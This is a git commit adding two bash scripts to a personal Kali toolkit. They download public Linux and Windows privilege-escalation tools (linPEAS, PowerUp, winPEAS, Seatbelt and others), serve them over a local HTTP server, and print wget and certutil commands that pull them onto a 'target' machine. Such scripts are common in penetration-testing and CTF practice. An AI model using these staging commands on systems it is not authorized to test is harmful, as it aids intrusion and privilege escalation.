37199c1c2d2394762eeee2d676069f860bb20643
Emir <e9256@protonmail.com>
2021-04-21 14:24:47 +0200

    Automated commit

---
+++ mykali/tools/lin-priv-esc-tools.sh
@@ -0,0 +1,80 @@
+#!/bin/bash
+
+if [ $# != 2 ]; then
+  echo "Usage: $0 <LHOST/INTERFACE> <LPORT>"
+  echo ""
+  echo "Example: $0 10.10.14.12 80"
+  echo "Example: $0 tun0 8080"
+  echo "Example: $0 tun0 random"
+  echo ""
+  exit 1
+fi
+
+ip=$1
+ip_length=$(echo $ip | wc -c)
+if [ $ip_length -le 5 ]; then
+  ip=$(ip addr | grep $ip | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
+  if [ ! $ip ]; then
+    echo "Selected interface doesn't have IP address."
+    exit 1
+  fi
+fi
+
+mkdir tools ; cd tools
+
+port=$2
+if [ $port == random ]; then
+  port=$((1024 + RANDOM % 50000))
+fi
+
+if [ ! -f "linpeas.sh" ]; then
+  wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
+fi
+
+if [ ! -f "suid3num.py" ]; then
+  wget "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" -O suid3num.py
+fi
+
+if [ ! -f "linenum.sh" ]; then
+  wget "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh
+fi
+
+if [ ! -f "lse.sh" ]; then
+  wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
+fi
+
+if [ ! -f "linux-exploit-suggester.sh" ]; then
+  wget "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O linux-exploit-suggester.sh
+fi
+
+if [ ! -f "linuxprivchecker.py" ]; then
+  wget "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py
+fi
+
+if [ ! -f "pspy64" ]; then
+  wget "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64" -O pspy64
+fi
+
+if [ ! -f "pspy32" ]; then
+  wget "https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32" -O pspy32
+fi
+
+echo ""
+echo "You can download any of these tools to your target linux machine using commands below:"
+echo ""
+echo "wget http://$ip:$port/linpeas.sh; chmod +x linpeas.sh"
+echo "wget http://$ip:$port/suid3num.py; chmod +x suid3num.py"
+echo "wget http://$ip:$port/linenum.sh; chmod +x linenum.sh"
+echo "wget http://$ip:$port/lse.sh; chmod +x lse.sh"
+echo "wget http://$ip:$port/linux-exploit-suggester.sh; chmod +x linux-exploit-suggester.sh"
+echo "wget http://$ip:$port/linuxprivchecker.py; chmod +x linuxprivchecker.py"
+echo "wget http://$ip:$port/pspy64; chmod +x pspy64"
+echo "wget http://$ip:$port/pspy32; chmod +x pspy32"
+echo ""
+
+if [ $port -lt 1024 ]; then
+  echo "Port is less than 1024, you need to provide your sudo password..."
+  sudo python3 -m http.server $port
+else
+  python3 -m http.server $port
+fi
---
+++ mykali/tools/win-priv-esc-tools.sh
@@ -0,0 +1,99 @@
+#!/bin/bash
+
+if [ $# != 2 ]; then
+  echo "Usage: $0 <LHOST/INTERFACE> <LPORT>"
+  echo ""
+  echo "Example: $0 10.10.14.12 80"
+  echo "Example: $0 tun0 8080"
+  echo "Example: $0 tun0 random"
+  echo ""
+  exit 1
+fi
+
+ip=$1
+ip_length=$(echo $ip | wc -c)
+if [ $ip_length -le 5 ]; then
+  ip=$(ip addr | grep $ip | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
+  if [ ! $ip ]; then
+    echo "Selected interface do not have an IP address."
+    exit 1
+  fi
+fi
+
+# Simple solution
+mkdir tools
+cd tools
+
+port=$2
+if [ $port == random ]; then
+  port=$((1024 + RANDOM % 50000))
+fi
+
+if [ ! -f "PowerUp.ps1" ]; then
+  wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+fi
+
+if [ ! -f "Sherlock.ps1" ]; then
+  wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
+fi
+
+if [ ! -f "jaws-enum.ps1" ]; then
+  wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
+fi
+
+if [ ! -f "windows-exploit-suggester.py" ]; then
+  wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
+fi
+
+if [ ! -f "Seatbelt.exe" ]; then
+  wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
+fi
+
+if [ ! -f "SharpUp.exe" ]; then
+  wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe
+fi
+
+if [ ! -f "accesschk.exe" ]; then
+  wget https://xor.cat/assets/other/Accesschk.zip
+  unzip Accesschk.zip
+  rm Eula.txt Accesschk.zip
+fi
+
+if [ ! -f "winPEASany.exe" ]; then
+  wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe
+fi
+
+if [ ! -f "Watson.exe" ]; then
+  wget https://github.com/4ndygu/precompiled-watsons/raw/master/Watson.exe
+fi
+
+if [ ! -f "Autoruns64.exe" ]; then
+  wget https://live.sysinternals.com/Autoruns64.exe
+fi
+
+if [ ! -f "wes.py" ]; then
+  wget https://raw.githubusercontent.com/bitsadmin/wesng/master/wes.py
+fi
+
+echo ""
+echo "You can download any of these tools to your target windows machine using commands below:"
+echo ""
+echo "certutil.exe -urlcache -split -f http://$ip:$port/accesschk.exe accesschk.exe"
+echo "certutil.exe -urlcache -split -f http://$ip:$port/winPEASany.exe winPEASany.exe"
+echo "certutil.exe -urlcache -split -f http://$ip:$port/Seatbelt.exe Seatbelt.exe"
+echo "certutil.exe -urlcache -split -f http://$ip:$port/SharpUp.exe SharpUp.exe"
+echo "certutil.exe -urlcache -split -f http://$ip:$port/PowerUp.ps1 PowerUp.ps1"
+echo "certutil.exe -urlcache -split -f http://$ip:$port/Sherlock.ps1 Sherlock.ps1"
+echo "certutil.exe -urlcache -split -f http://$ip:$port/Watson.exe Watson.exe"
+echo "certutil.exe -urlcache -split -f http://$ip:$port/jaws-enum.ps1 jaws-enum.ps1"
+echo "certutil.exe -urlcache -split -f http://$ip:$port/Autoruns64.exe Autoruns64.exe"
+echo "
+For kernel exploit checking CHECK NOTES...make sure smbserver.py is running"
+echo ""
+
+if [ $port -lt 1024 ]; then
+  echo "Port is less than 1024, you need to provide your sudo password..."
+  sudo python3 -m http.server $port
+else
+  python3 -m http.server $port
+fi
